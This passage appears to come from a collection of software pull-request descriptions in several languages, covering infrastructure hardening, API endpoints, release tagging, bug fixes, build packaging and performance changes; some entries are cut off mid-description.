abort and the updates run in parallel. - Tracks every attempt that writes a pending row so the controller can cancel them on disconnect. - Cancels only rows still `pending`, so an already-written terminal outcome is preserved; the last attempt's cancel is a no-op unless its normal cancellation write failed. - If a cancel fails it's logged, and the request still ends and the rate limit slot is released. Written for commit ad4d480f4550acdc67fc190e1715cddc22a47e9b. Summary will update on new commits.

author: minhelly
body:
# [PR] Hardening Staging Infrastructure, Database Schemas, CI/CD Immutability, Keycloak Automation & Nginx Security

- **Source Branch**: `infra/staging-hardening`
- **Target Branch**: `develop`
- **Related Issues / Tasks**: P0 (Nginx Hardening, Keycloak Lockdown & Auto-Reconcile, CI Gates), P1 (Config Parity, Healthchecks, Reproducible Builds)

---

## 1. Tổng quan & Mục tiêu (Overview)
PR này hoàn thiện toàn diện quá trình chuẩn hóa và củng cố hạ tầng (**Infrastructure Hardening**) cho Fakebook từ môi trường **DEV** lên **STAGING** và sẵn sàng cho **PRODUCTION**:
1. Chuẩn hóa cơ sở dữ liệu trên AWS RDS MariaDB (idempotent bootstrap, schema snake_case).
2. Bảo mật Nginx Reverse Proxy (dynamic template với `envsubst`, khóa chặt Keycloak Admin Console).
3. Đảm bảo tính toàn vẹn CI/CD (validation gate, immutable tags `sha-<full-40-char-sha>`, deterministic Jib container builds).
4. Chuẩn hóa cấu hình môi trường (loại bỏ toàn bộ hardcoded `localhost` ở profile `prod`, tắt tự động Spring Docker Compose, fail-fast bảo mật Cloudinary).
5. Tự động hóa Keycloak IAM (reconcile client `web_app`, redirect URIs, PKCE S256 và sửa script POSIX tương thích đa nền tảng).

---

## 2. Chi tiết các thay đổi chính (Detailed Changes)

### 2.1. Hạ tầng Nginx Reverse Proxy & Bảo mật Keycloak Admin (P0)
- **Dynamic Nginx Template (`envsubst`)**:
  - Chuyển đổi file cấu hình sang [nginx.conf.template](file:///c:/Code/fakebook/infrastructure/nginx/nginx.conf.template), loại bỏ các giá trị hard-code (`server_name`, đường dẫn SSL Let's Encrypt, URL frontend Vercel).
  - Sử dụng bộ lọc `NGINX_ENVSUBST_FILTER: "PUBLIC_DOMAIN|FRONTEND_URL|TLS_CERT_NAME|KEYCLOAK_ADMIN_ALLOWLIST"` để bảo vệ 100% các biến runtime của Nginx (`$host`, `$remote_addr`, `$request_uri`, v.v.).
- **Khóa chặt Keycloak Admin Console (`/admin/`)**:
  - Thiết lập cơ chế kiểm soát truy cập đa tầng: Cho phép Localhost qua SSH Tunnel (`ssh -L 8443:localhost:443`), dải mạng nội bộ VPN/Tailscale (`100.64.0.0/10`), danh sách IP cho phép qua `KEYCLOAK_ADMIN_ALLOWLIST`, và chặn toàn bộ IP công cộng bên ngoài với phản hồi `403 Forbidden`.
- **Git Security**:
  - Đưa `infrastructure/nginx/nginx.conf` vào [.gitignore](file:///c:/Code/fakebook/.gitignore) và untrack khỏi Git. Cập nhật script [init-letsencrypt.sh](file:///c:/Code/fakebook/infrastructure/nginx/init-letsencrypt.sh) tự động nạp `.env.staging`.

### 2.2. Tự động hóa Cấu hình Keycloak Realm & Sửa Lỗi Script (P0)
- **Keycloak Realm Reconciler**:
  - Bổ sung script [configure-realm.sh](file:///c:/Code/fakebook/infrastructure/keycloak/configure-realm.sh) tự động đồng bộ client `web_app`: cập nhật redirect URIs (hỗ trợ localhost các port `5173`, `8080`, `8443`, `9000`, Staging domain và Vercel URL), bật PKCE `S256` và đồng bộ `frontendUrl` của realm, ngăn ngừa drift cấu hình khi Keycloak DB đã khởi tạo.
- **Tương thích Container POSIX**:
  - Tái cấu trúc [configure-google-idp.sh](file:///c:/Code/fakebook/infrastructure/keycloak/configure-google-idp.sh) sang chuẩn POSIX `/bin/sh` thuần túy, loại bỏ lỗi crash do ký tự xuống dòng Windows CRLF (`set: pipefail: invalid option name`).

### 2.3. Quy trình CI/CD & Image Bất biến (Immutability) (P0)
- **Compose Validation Gate**:
  - Bổ sung stage `validate-config` trong [.github/workflows/ci.yml](file:///c:/Code/fakebook/.github/workflows/ci.yml) chạy `docker compose config` kiểm tra cú pháp cả dev và staging template trước khi build.
- **Immutable Container Image Tags**:
  - Chuẩn hóa định dạng image tag thành **Full 40-character Git SHA** (`${IMAGE_NAME}:sha-${FULL_SHA}`) trên cả CI workflow lẫn [infrastructure/.env.staging.example](file:///c:/Code/fakebook/infrastructure/.env.staging.example).
- **Cập nhật E2E Smoke Test**:
  - Cập nhật [scripts/e2e-smoke-test.sh](file:///c:/Code/fakebook/scripts/e2e-smoke-test.sh) gọi chính xác endpoint `/services/postservice/api/posts/create` (với payload `CreatePostRequestDTO`) và `/services/feedservice/api/feed/me`.

### 2.4. Tính Tất định (Reproducible Builds) & Docker Staging Hardening (P1)
- **Reproducible Jib Builds**:
  - Thêm cấu hình `<creationTime>EPOCH</creationTime>` cho plugin `jib-maven-plugin` trên cả 7 `pom.xml` (`authService`, `commentService`, `feedService`, `gateway`, `mediaService`, `postService`, `userService`) giúp digest của container image mang tính tất định.
- **Persistent Volume & Healthchecks cho Staging**:
  - Bổ sung volume `kafka-data` vào [docker-compose-staging.yml](file:///c:/Code/fakebook/infrastructure/docker-compose-staging.yml) bảo toàn dữ liệu Kafka event-bus.
  - Khai báo healthcheck chi tiết cho Kafka, Zipkin, Gateway, Nginx và cả 6 microservices để đảm bảo tính sẵn sàng trước khi nhận traffic (`--wait`).
  - Ghim cố định image tag `provectuslabs/kafka-ui:v0.7.2` (thay vì `:latest`).

### 2.5. Chuẩn hóa Cấu hình (Config Parity) & DevEx (P1)
- **Loại bỏ Localhost khỏi Prod Profile**:
  - Xóa bỏ toàn bộ hardcoded `localhost:3307`, `localhost:8500`, `localhost:9411` trong cả 7 file `application-prod.yml`. Chuyển sang placeholder môi trường (`${SPRING_DATASOURCE_URL}`, `${SPRING_CLOUD_CONSUL_HOST:consul}`, `${MANAGEMENT_ZIPKIN_TRACING_ENDPOINT}`).
- **Tắt mặc định Spring Boot Docker Compose**:

author: deleonio
body:
## Summary

Behebt drei Probleme der Säulen-Neuberechnung aus #1615, die in Produktion aufgefallen sind. Ein Lauf über 145 Aufgaben meldete „88 neu zugeordnet, 3 unverändert, 54 fehlgeschlagen“, und während der Berechnung bewegte sich die Fortschrittsanzeige nicht.

## Diagnose

| Symptom | Ursache |
| --- | --- |
| Anzeige steht auf „0 / 0“ | Das Modal übergab kein `limit`, der Server nahm deshalb 200. Alle 145 Aufgaben liefen in einem einzigen Request, und `total`/`processed` waren erst mit der Antwort bekannt. |
| 54 fehlgeschlagen | Vermutlich ein Rate-Limit beim Provider: 145 LLM-Aufrufe ohne Pause, die Retries nach 250 und 500 ms sind zu kurz für ein Rate-Limit-Fenster. Den Grund sah man nur im Server-Log. |
| Jeder Neustart verarbeitet alles erneut | Der Server merkte sich keinen Stand. Den Offset gab es nur innerhalb eines offenen Modals. |
| Nebenbefund | `onCompleted={onSaved}` navigierte aus den Einstellungen weg. Das widersprach dem Kommentar an derselben Stelle. |

## Changes

### Server
- `MistralRequestError` bekommt die optionalen Felder `status` und `retryAfterMs` (aus `Retry-After`).
- Bei 429/5xx: bis zu 5 Versuche mit `Retry-After` oder exponentiellem Backoff ab 1 s, gedeckelt auf 20 s. Andere Fehler behalten die bisherigen kurzen Retries. Dazu 200 ms Pause zwischen zwei Aufgaben.
- `failureReasons` im Ergebnis: Grund → Anzahl, z. B. `{"HTTP 429": 12}`. Enthält bewusst keine rohen Fehlermeldungen.
- **Fortsetzbarer Lauf:** `tasks.pillarsRecalculatedAt` wird bei `updated` und `skipped` gesetzt (`silent`, `updatedAt` bleibt unverändert), bei `failed` nicht. `users.pillarRecalcStartedAt` merkt sich den Laufstart. Ein Lauf ohne `restart=true` verarbeitet nur Aufgaben, die seit diesem Start nicht erfolgreich neu berechnet wurden. `offset` zählt in diesem Modus nur die Fehlschläge der laufenden Serie.
- Neuer Endpunkt `GET /tasks/reassign-pillars/status` → `{ startedAt, total, pending }`. Er liegt auf einem eigenen Unterpfad, weil `GET /tasks/:id` einen Endpunkt direkt unter `/tasks/reassign-pillars` abfangen würde.
- Migration `migratePillarRecalcColumns` (idempotent, vor `sync()`).

### Frontend
- `RecalcPillarModal` fragt in Portionen zu 5 Aufgaben an, der Balken läuft live mit. Vor der ersten Antwort steht dort „Ermittle Aufgaben…“ statt „0 / 0“.
- Das Modal zeigt den Stand des letzten Laufs („91 von 145 neu berechnet, 54 noch offen“) mit den Buttons **Fortsetzen** und **Alle neu starten**. Nach dem Lauf listet es die Fehlergründe auf und bietet „Fortsetzen“ an.
- `onCompleted` ist jetzt mit `onCategoryChanged` verdrahtet und lädt nur neu, ohne Navigation.

### Vertrag
`openapi.yml`: `restart`-Parameter, `failureReasons`, `GET /tasks/reassign-pillars/status`, Schema `OwnReassignPillarsStatus`.

## Test Plan

- [x] Server: 429-Retry über mehr als 3 Versuche, `failureReasons`, Fortsetzen verarbeitet nur fehlgeschlagene und nicht erreichte Aufgaben, Neustart nimmt wieder alle, offset im Fortsetzen-Modus lässt nichts aus, Migration idempotent
- [x] Frontend: `limit: 5`, `restart` nur beim ersten Aufruf, offset wächst nur um `failed`, Anzeige von Stand, Fortsetzen und Fehlergründen, `onCompleted` löst keine Navigation aus
- [x] Lokal: format, lint (inkl. tsc), knip, `pnpm -r test` grün. `test:scripts` scheitert lokal an `mapfile` (Bash 3.2 unter macOS) und an einem zeitabhängigen Test in `wait-for-checks`. Diese Skripte berührt der PR nicht.
- [ ] Manuell mit echtem Mistral-Key: Fortschritt läuft sichtbar, Fehlergründe erscheinen, „Fortsetzen“ nach einem Reload
- [ ] Nach dem Deploy in Prod: Fehlergründe prüfen, um die Annahme „Rate-Limit“ zu bestätigen

Refs #1614

body:
### Description

回收权限目前只有 v1 的 `revoke_permissions`。本次在 v2 sync 下新增 `v2_sync_revoke_permission`，并与 `v2_sync_grant_permission` 对称，支持按网关、按资源两个维度回收。

接口为 `DELETE /api/v2/sync/gateways/{gateway_name}/permissions/revoke/`，鉴权与其它 sync 接口一致，调用方需为网关的关联应用。

本次修改：

- 请求参数：
  - `target_app_codes`：不能为空，且不能包含 OAuth2 内置应用（`public`、`personal`），它们的权限由系统管理。
  - `grant_dimension`：可选 `gateway`、`resource`，不接受旧值 `api`。
  - `resource_names`：按资源回收时必填。
- 按网关回收：删除这些应用在当前网关下按网关维度授予的权限，不影响按资源授予的权限。
- 按资源回收：只删除 `resource_names` 对应资源的权限。不存在的资源名称会被忽略，与授权接口一致，重复调用结果不变；全部不存在时不删除任何权限。
- 成功时返回 200 `{"data": null}`，而不是 204：bkapi-client-core 会解析响应体，空响应体会导致 apigw-manager 抛出 `ApiResponseError`。
- 补充网关资源定义、中文文档和英文翻译，新增视图、序列化器及 OpenAPI 契约测试。

与 v1 的差异：`grant_dimension` 的取值由 `api` 改为 `gateway`，新增按资源回收，响应改为 v2 格式。

后续：接口发布、SDK 重新生成后，apigw-manager 需要补充对应的 revoke 方法，不在本 PR 范围内。

验证：相关测试 29 项通过；`apigateway/tests/apis/v2/` 中除 2 个 ESB 用例外全部通过，这 2 个用例在 `--nomigrations` 下因缺表失败，master 上同样失败，与本次改动无关；`make lint-check`（ruff、mypy、import-linter、API 一致性检查）通过。尚未完成本地开发环境联调。

`v0.5.5-test.1` 现在推上去，已装的正式版客户端会当场被指到测试构建。两个缺口都在发布线上，不在 DENE-784 的范围里。

## 1. `beta*.yml` 连资产都算不上

`scripts/desktop-release-assets.mjs` 的 `FEED_PATTERN` 只认 `latest*.yml`。测试通道写出的 `beta-mac.yml` 过不了 `isReleaseAssetName`，`collectLocalAssets` 直接跳过——测试通道发出去的 Release 里没有更新清单。

改成 `latest*` / `beta*` 都是清单，红线 7 的「产物 → blockmap → 清单」分批顺序因此对两条通道一视同仁。

## 2. 预发布 tag 会抢走 Latest

`desktop-release.yml` 与 `cli-release.yml` 建 Release 时都不带 `--prerelease`，而且两条 workflow 抢的是同一个 tag push。`/releases/latest` 会从 v0.5.4 挪到 `v0.5.5-test.1`，正式通道的客户端下一轮轮询就跟着走了。

tag 里带 prerelease 段（strict semver 校验只让 `-suffix` 这一种破折号通过）就标 prerelease；Release 已存在时也补标一次，因为谁赢了竞态都可能是对方建的。

## 验证

- `node --test scripts/desktop-release-assets.test.mjs` — 20 passed。

author: acoseac
body:
Found by the 2026-09-23 code pass, in `internal/packaging` — 1,636 lines with the thinnest production:test ratio in the repo (2.44) and no appearance in any dated review section.

## The defect

`Stop`, `Start` and `Restart` all gate on `KindLaunchdSystem` / `KindSystemdSystem` and return `ErrSystemInstallNeedsRoot`. **`Uninstall` had no such gate**, and the two POSIX uninstallers touch only the fixed *user*-level path (`~/Library/LaunchAgents`, `~/.config/systemd/user`) and treat a missing file as success.

So against a sudo install it returned `(userPath, nil)`. `cmd/bridge/menu.go` asks *"Uninstall the background service (macOS LaunchDaemon)?"*, gets no error, and prints **"service uninstalled."** — while the LaunchDaemon is still registered and still running. The same flow then offers `os.RemoveAll(cfgDir)`: config, data, certs and **the token store**, out from under a live bridge.

The Windows arm of the same function already reasons about exactly this — it surfaces the SCM error rather than swallowing it, so that a stuck stop is not *"a zombie service reported as a clean uninstall"*. The POSIX arms did not make the distinction.

## The fix

One predicate, `NeedsRootFor`, read by all four entry points. It was previously the same two terms written out in three places and absent from the fourth — the enumeration shape this repo keeps recording.

The menu skips the wipe after a refused uninstall **and says why**, because a silently-skipped step reads as the menu being finished.

## Both first-draft tests were vacuous, and the controls are what said so

This is the part worth reviewing.

**The menu test** drove the real `actUninstall` with a refusing uninstall and asserted the config dir survived — and **passed with the guard removed**. Its input was `"y\n"`, enough for the uninstall question, so a regression that offered the wipe anyway read `""` at the exact-phrase prompt, the phrase check refused, nothing was deleted, and the file assertions passed while the guard was gone. Queuing `"y\nWIPE\n"` makes the second line consumable *only* if the wipe is offered. The control now reports:

```
the token store was removed under a service that is still running
the config dir was wiped under a service that is still running
```

**The packaging test** called the real `Uninstall` and asserted the refusal shape. It **passed with the gate removed, and always will on CI**: `installedKindForOS` probes `/Library/LaunchDaemons` and `/etc/systemd/system`, which only root can create, so the gate never fires on a test host. A behavioural test of that wiring cannot fail.

Replaced with an AST walk requiring each of the four entry points to reference `NeedsRootFor` — anchored on the **identifier**, not a string, because this package's own commentary names what it discusses — with a `checked` floor so a parse that matched nothing cannot pass. Its control reports `Uninstall does not consult NeedsRootFor`.

## Notes for review

- `NeedsRootFor` is exported specifically so the decision is drivable; the classification is pinned by an exhaustive table, and a second test walks past the last known `ServiceKind` so a newly-appended constant forces a decision rather than defaulting to "user-level, safe to remove from here" — the failure direction that loses data.
- `uninstallService` is a package-var seam in `cmd/bridge`. Documented as safe here because the menu is a single-threaded TTY dispatcher with no concurrent reader, unlike the seams this repo warns about where a package-var write can race a live handler.
- A positive control asserts the wipe *still happens* after a successful uninstall, so the guard cannot have quietly broken the command's actual purpose.

## Gate

`make fmt vet test build-all` clean — 45 packages ok under `-race` (`MAKE_EXIT=0`), six cross-compile targets, `GOOS={windows,darwin,linux} go vet` clean.

Record in `ops/engineering-log.md`; rule in `CLAUDE.md` under **Config, settings and process lifecycle**.

author: mastersam07
body:
**What:** `scripts/build-app.sh [debug|release]` produces `build/OpenDeviceHub.app` with the viewer, the `odhub` CLI beside it, an `Info.plist` and a placeholder icon. Run as a bare executable the app could only ever be called `odhub-viewer`, because a bundle is what carries a name: it now reads OpenDeviceHub in the menu bar, the app switcher and Activity Monitor, the last because the viewer is installed under the app's own name. The CLI keeps its name, and `odhub view` finds whichever of the two names sits beside it.

The bundle ID becomes `io.github.mastersam07.opendevicehub`, replacing `io.opendevicehub.app`. It is handle based rather than named after the product or a domain, so it survives a rename, and it can never change after a release without macOS treating the app as a different one.

Versions come from one place. `VERSION` holds the marketing version, the build script writes it into the bundle, and `Brand.version` reads it back at runtime. A build with no bundle, which is every source build, reports `0.0.0-dev`, so a development copy cannot be mistaken for a release. The build number is the commit count unless `ODH_BUILD_NUMBER` overrides it, and Sparkle compares that rather than the marketing version.

**Verification:** On Xcode 27.1 (27A9269).
- `build/OpenDeviceHub.app` launches a device window; the menu bar, the app switcher and `pgrep` all report OpenDeviceHub.
- The bundled `odhub doctor` runs from inside the bundle and reports Xcode 27.1 with every framework loaded.
- Release bundle reports `0.1.0` build `40`; the debug bundle and a plain `swift build` both report `0.0.0-dev`.
- `swift test`: 99 viewer, 180 engine, 0 failures.

**Follow-ups:** The icon is a placeholder, drawn by `packaging/make-icon.swift`, and wants real artwork before release. The app is not signed yet, so it is quarantined on download until R3 and R4.

**Note on the Intel slice:** dropped deliberately, and the README says so. SwiftPM builds `x86_64` and `lipo` joins it happily, but the frameworks the adapter `dlopen`s from Xcode are `arm64e` with no Intel slice, so that build would launch and fail at the first framework load. Rosetta is not installed here either, so it could not have been tested. `ODH_ARCHS` overrides the default.

author: spacedragon
body:
Two service-install fixes, one per commit.

## 1. Follow-up hints use the command the operator ran

Every hint hardcoded `agentconnect …`. After `npx -y @agentconnect.md/cli@rc install-service`, the CLI said `Run agentconnect up to start it`, a command that host may not have, or one that runs a different install.

- `src/invocation.ts` (new) works out the invocation once at startup, and `cliCommand(target)` returns it followed by the existing `commandSelector` suffix:
  - an entry under npm's `_npx` cache → `npx -y @agentconnect.md/cli@rc` (no tag for a stable version);
  - a PATH `agentconnect` that resolves to this very entry → `agentconnect`;
  - anything else → `node <entry>`.
- Elevated, detection reads the pre-sudo `--service-path` snapshot. The sudo child is the one that prints the install hint, and sudo's `secure_path` would miss a user-level global install.
- Every hint site now uses `cliCommand`: `index.ts`, `login.ts`, `delegate.ts`, `version-commands.ts`, `version-ops.ts`, `run-recovery.ts`, `service/index.ts`, and the systemd denial explanation, which also gains the instance selector it was missing.

## 2. A bare `--root` no longer re-points the default service

With the default unit on `~/.agentconnect`, `install-service --root <other>` resolved to the default instance, because `<other>/service.json` records no name, and was treated as a move. While the service ran, it was refused with "run `down` first". After following that advice, the retry rewrote `agentconnect.service` onto `<other>` and left the original root with no service.

A bare `--root` names no instance. `installService` now refuses whenever the default unit drives a different root, stopped or not, and names both ways out: `--instance <name> --root <other>` for a second daemon, or `uninstall-service` first to move the default one. Named instances keep their explicit, stopped-only move. `cli-daemon-split.md` §4.2.1 records the rule.

## Verification

- `pnpm --filter @agentconnect.md/cli typecheck`, eslint, and the CLI suite pass (279 passed, 2 skipped).
- `test/invocation.test.ts` (new) covers the npx rc and stable forms, a PATH bin that is this entry, a PATH bin that is a different install, path quoting, and the selector suffix.
- A new `service-index` case: a bare `--root` against a default unit on another root is refused with both remedies, nothing is rewritten, and `--instance cp2 --root <other>` then installs alongside.
- The built bundle, run with `version list` on a scratch root, printed `node <entry> …` from the worktree, `npx -y @agentconnect.md/cli …` from a copy under a fake `_npx` path, and `agentconnect …` through a global-style symlinked bin on PATH.
- A tsx harness against temp unit dirs and a fake systemctl reproduced the old behavior: refused while running, then re-pointed after stopping. With the fix, it refuses both times.

body:
- SWA prefill: spread KV cache writes over 32 workers keyed by cache
  row, and build window indices and block masks in parallel 4-row
  blocks
- Sparse attention: lower the proj_a row tile from 256 to 128, round the
  O-projection extent to a proj_a tile instead of a 512-row quant pad,
  and zero-initialize only the packed-head rows each group computes
- KV projection: widen the N tile from 128 to 256 and raise split-K from
  2 to 4
- HCA prefill: parallelize the cache write, SWA index build, readiness
  fence (now one slot per block) and query slicing with row-tiled spmd
- Ratio-128 compressor: read current-tile pool rows directly from
  projection scratch and only fetch persistent state for earlier history

On a2a3 with TP4, B=1 and S=N=512 (10 rounds after 2 warmups), the
fastest-rank median drops from 2918.6 to 2689.5 us for SWA (-7.85%) and
from 4859.7 to 4387.0 us for HCA (-9.73%).

author: pkmetski
body:
## What

`UnboundedBrowseViewModel` had no `DispatcherProvider`, so three heavy computations ran synchronously on Main every time the ABS library items flow emitted:

- `buildOwnedItemIndex()` — builds a fuzzy-matching ownership index with per-item Regex and NFD normalization (O(N) work).
- `buildProgressByNormKey()` — builds a progress lookup map by normalized title+author key.
- The `filteredItems` combine — calls `index.isOwned(item)` for every catalog item, O(N×M) for fuzzy strategies 4–6.

On large ABS libraries (Gramofonche, for instance, is a Chitanka catalog alongside a large ABS upload collection) with "unowned" and "unplayed" filters active, every Room cursor emission triggered these computations on Main, causing multi-second UI stalls and frozen filter chips.

## How

Added `dispatchers: DispatcherProvider` to `UnboundedBrowseViewModel` (and the four concrete subclasses: `ChitankaBrowseViewModel`, `GutenbergBrowseViewModel`, `RadioEsBrowseViewModel`, `OReillyBrowseViewModel`). The three heavy flows now chain `.flowOn(dispatchers.default)` before `.stateIn(...)`, moving all compute work off Main. Koin factories on both Android and iOS now pass `dispatchers = get()`.

This follows the existing pattern from `LibraryFilterEngine`/`LibraryFilterEngineThreadingTest`.

## Tests

**Android:**
- `UnboundedBrowseViewModelThreadingTest` (androidHostTest) — new threading test using two dispatchers (`testDispatcher` for Main, real `Dispatchers.Default` for compute). Asserts that the `map` lambda inside `serverSourceProgressByNormKey` (upstream of `flowOn`) runs on a `DefaultDispatcher` worker thread, never on the collector (Main) thread.
- `ChitankaBrowseViewModelTest` and `GutenbergBrowseViewModelTest` (androidHostTest) — updated with the new `TestDispatcherProvider` constructor param.

**iOS counterpart reasoning (two accepted exceptions per updated AGENTS.md):**
1. *JVM-primitive threading test*: `UnboundedBrowseViewModelThreadingTest` uses `Thread.currentThread()` (JVM-only). The fix is in `commonMain`; `flowOn` works identically on iOS. Functional behaviour is covered by `OwnedItemMatcherTest` (commonTest in `feature:source`, runs on `iosSimulatorArm64`).
2. *Room-coupled concrete constructor*: `ChitankaBrowseViewModel` takes `WebSourceItemGate`, whose own constructor chains into `RemoteItemFreshnessDao` (Room). A commonTest can't construct that dependency, so a VM-level commonTest is infeasible. The androidHostTest covers the VM-level integration using mockk; commonTest covers the pure-function iOS path.

author: lgarczyn
body:
Adds `GzipFileAttachmentContent`, a `FileAttachmentContent` whose stream gzips the file as it is read, plus an `AddAttachment(filePath, compress: true)` overload on `Scope` and `SentryHint`.

Ai-generated (Fable)

### Why

We like to attach logs to crashes. But it's expensive as hell, even if the logs are the same thing over and over.

Compressing it on the capturing thread is not an option either, since `IAttachmentContent.GetStream()` runs synchronously inside `CaptureEvent`. The SDK already buffers non-seekable payloads on its background worker when serializing the envelope, so a stream that compresses lazily on `Read` is entirely outside the main thread.

### What

- `GzipFileAttachmentContent : FileAttachmentContent`. Opens the file when the event is captured (same as the base class, so a missing file logs and skips the attachment), reads and compresses only when the envelope is serialized. Because it is a `FileAttachmentContent`, scope observers that sync file attachments to native SDKs still receive the path of the uncompressed file.
- `FileAttachmentContent.GetStream()` becomes `virtual`.
- `Scope.AddAttachment(string filePath, bool compress, ...)` and `SentryHint.AddAttachment(string filePath, bool compress, ...)`. A compressed attachment is named `<file>.gz` with content type `application/gzip` unless one is given.
- Internal `GzipReadStream`: read-only, non-seekable, pulls the source through `GZipStream` chunk by chunk.

### Tests

Round trip through gunzip for empty, small and multi-chunk inputs, small-buffer reads, no read at construction, file not locked, envelope round trip with the `length` header matching the compressed bytes, the scope observer receiving a `FileAttachmentContent` with the raw path. API approval snapshots updated for all target frameworks.

### Changelog Entry

- feat: `GzipFileAttachmentContent` and `Scope`/`SentryHint.AddAttachment(filePath, compress: true)` attach a file gzip-compressed, with the compression done on the background worker

author: xup60521
body:
## Summary

These are Windows fixes for the stream lifecycle commands (`cleanup`, `ditch`, `finish`) on the 8.3 overlay. Streams are the feature worktrees the remote-coding workflow runs in.

- **`8caf3c4`**: `agf cleanup` and `agf ditch` now build the main-checkout path the same way `finish` does (`path.dirname(real_path(git-common-dir))`). Before, they used Git's forward-slashed path, so the `cd` target, recovery commands and log lines were in a different form on Windows.
- **`4a39262`**: Guard 3, which stops cleanup from deleting the folder the running host is in, now compares resolved paths on both sides. After `8caf3c4`, one side was a real path and the other Git's raw path, so a symlinked, junctioned or differently spelled path could get past the guard.
- **`08846ea`**: test harness only. The local git test wrapper can now run on win32 (it finds `git.exe` and builds a small native launcher with the in-box .NET `csc.exe`). POSIX behaviour is unchanged.
- **`2a01ce0`**: tests only. Fixture repos for exact-byte `finish` tests are pinned to `core.autocrlf=false`, so a global `core.autocrlf=true` no longer alters the bytes under test.

Most of the other `finish` failures seen on Windows were already fixed by the upstream 8.3.2 merge (`stream_doc` now uses `path.posix.join`).

## Review status

- `8caf3c4`, `08846ea`: independently reviewed, PASS.
- `4a39262`, `2a01ce0`: **not reviewed yet** (the review run was stopped). `4a39262` is safety-critical, so review it before merging.

## Open questions

- The Windows test git wrapper depends on `%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe`, which ships with standard Windows 10/11.

Tablica „Sponsorzy i reklama” (kod dodany przez Lovable 22.09):

| # | Błąd | Skutek |
|---|---|---|
| 0 | **Tablica nie wysyłała klucza technicznego nowej sekcji**, a `admin_event_sponsor_tier_save` odmawia nowego poziomu bez klucza `^[a-z][a-z0-9_]{1,48}$` (`invalid_key`) | **Żadna sekcja nie powstawała.** Organizator widział ogólny błąd. Znalezione przy okazji i sprawdzone w migracji `20260824092824` |
| 1 | Panel boczny kopiował tytuły z wiersza sekcji w efekcie zależnym od całego obiektu `tier` | Obiekt jest nowy po każdym odświeżeniu listy (zmiana układu, zapis przekierowania, usunięcie logotypu), więc wpisany, a niezapisany tytuł znikał |
| 2 | Zmiana układu wołała tylko `admin_event_sponsor_tier_set_layout`, a ta zmieniała samą kolumnę `layout` | Baner przełączony na siatkę zostawał z limitem 1, a druga firma odbijała się od `tier_full` z ogólnym komunikatem. Siatka przełączona na baner zostawała bez limitu |
| 3 | Po udanym zapisie sekcji i nieudanym zapisie układu okno dodawania zostawało otwarte | Drugie wysłanie tworzyło **drugą sekcję** o tym samym tytule |
| 4 | Kolejność i ranga nowej sekcji (oraz kolejność nowego sponsora) liczone z liczby wierszy | Po usunięciach nowy element trafiał na zajętą wartość albo stawał przed ostatnim |
| 5 | `deleteConfirmBody` („Sekcję można usunąć dopiero, gdy nie ma w niej firm…”) służył też jako treść potwierdzenia | Okno potwierdzenia pojawia się tylko przy **pustej** sekcji, więc treść była sprzeczna z sytuacją |

## Poprawka

- **Migracja `20260923100100_event_sponsor_layout_follows_limit`** wraz z bliźniakiem drizzle `0043`, wpisem w dzienniku i w `MIGRATION_LANES`. Nowa wersja `admin_event_sponsor_tier_set_layout`:
  - `banner` ustawia `max_companies = 1`; wcześniej funkcja odmawia (`banner_single_image`), jeśli sekcja ma więcej niż jedną firmę,
  - `grid` zdejmuje limit tylko wtedy, gdy jest to pozostałość po banerze (poprzedni układ `banner` i limit 1). Każdy inny limit zostaje,
  - wiersz poziomu jest blokowany **w granicach najemcy** (`FOR UPDATE`), zanim cokolwiek zostanie policzone. Cudzy UUID dostaje `false`, a nie `banner_single_image`. To domyka znany defekt z harnessu zdarzeń, który ujawniał najemcy B liczbę firm w poziomie najemcy A,
  - `NULL` jako układ zwraca `invalid_layout` (wcześniej kończył się naruszeniem NOT NULL).
  - Sygnatura, SECURITY DEFINER, `search_path` i uprawnienia bez zmian.
- **Tablica** (`SponsorSectionsBoard`):
  - klucz sekcji powstaje z tytułu (bez diakrytyków, z przyrostkiem `_2`, `_3`… przy zajętym kluczu),
  - kolejność i ranga liczone od maksimum, nie od liczby wierszy,
  - okno dodawania zamyka się od razu po zapisie sekcji. Jeśli zapis układu padnie, otwiera się panel nowej sekcji z osobnym komunikatem PL/EN,
  - limit banera ustawia wyłącznie baza,
  - `tier_full` przy dodawaniu firmy pokazuje zdanie z mapy odmów, a nie ogólny błąd.
- **Panel boczny:** nowa molekuła `SponsorSectionTitleForm` montowana z `key={tier.id}`, bez efektu synchronizującego. Przycisk „baner” jest wyłączony przy więcej niż jednej firmie i ma wyjaśnienie PL/EN pod `aria-describedby`. `banner_single_image` i `invalid_layout` mają własne zdania PL/EN.
- **Teksty:** `deleteBlocked` to podpowiedź pod wyłączonym przyciskiem, a `deleteConfirmBody` to prawdziwe potwierdzenie: sekcja zniknie z panelu i ze strony wydarzenia, bez możliwości cofnięcia.

## Testy

- Nowy `SponsorSectionTitleForm.test.tsx` oraz nowe i zaktualizowane przypadki w `SponsorSectionDrawer.test.tsx`, `SponsorSectionsBoard.test.tsx` (m.in. numeracja z lukami, klucz sekcji, awaria układu, brak duplikatu), `adminSponsorErrors.test.ts` i `sponsorBoardApi.test.ts`. Testy, które utrwalały błąd (okno otwarte po awarii układu, limit 1 wysyłany z tablicy), mają komentarz `ZMIANA` z powodem.
- **Na plikach produktu z `main` testy nie przechodzą: 27 niezaliczonych** (sprawdzone przez podmianę plików).
- `events-harness` (`30_sponsors.sql`) sprawdza regułę układu, blokadę najemcy i `invalid_layout`. Lokalnie: OK, 114 migracji, 1113 asercji.
- Pokrycie zmienionych plików: 100/100/100/100 (progi `admin/events/**`, `organisms/**`, `molecules/**` spełnione).
- Lokalnie przechodzą: `tsc --noEmit --incremental false`, eslint, prettier, `check:sql-migration-replay`, `check:rpc-contract`, `check:types-freshness`, `check:authz-snapshot`, wszystkie `check:sql-*`, `check:permissions-parity`, `check:module-singletons`, bramki i18n i rzutowań.

author: kaishin
body:
## Problem

The site is pinned to `astro@^5.15.5` with `.node-version` at `20.18.1`, below the runtime floor every Astro release after 5 requires, and the `@astrojs/*` integrations are on their Astro 5 majors. The legacy content collections API (`src/content/config.ts` with no loader, `post.slug`, `await post.render()`) is removed in Astro 6+, so the upgrade crosses two breaking-change boundaries at once. There is also no `check` or `format:check` script entry point, which the backlog items in this chain depend on.

## Solution

One toolchain PR covering the ordered Architecture Sync items 1–3 from `TODO.md`:

- **Scripts.** Add `pnpm check` (`astro check`), `pnpm format`, and `pnpm format:check` to `package.json`, and switch `README.md`/`CLAUDE.md` command docs from `npm` to `pnpm` to match the pinned `packageManager`.
